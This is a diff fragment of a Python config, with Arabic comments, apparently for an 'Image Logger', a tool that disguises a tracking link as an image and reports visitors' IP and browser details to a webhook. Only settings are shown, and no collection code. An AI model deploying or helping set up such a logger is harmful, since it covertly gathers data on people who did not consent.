@@ -5,7 +5,7 @@ import requests, base64, httpagentparser, json, os
 # نفس الكونفغ ولكن مع تعديل الـ webhook
 config = {
     "webhook": "YOUR_WEBHOOK_URL",  # ضع رابط الـ webhook الخاص بك هنا
-    "image": "https://img.magnific.com/free-vector/top-high-rocky-mountains-clouds-night_107791-25978.jpg",
+    "image": "حط الصورة هون",
     "imageArgument": True,
     "username": "Image Logger",
     "color": 0x00FFFF,
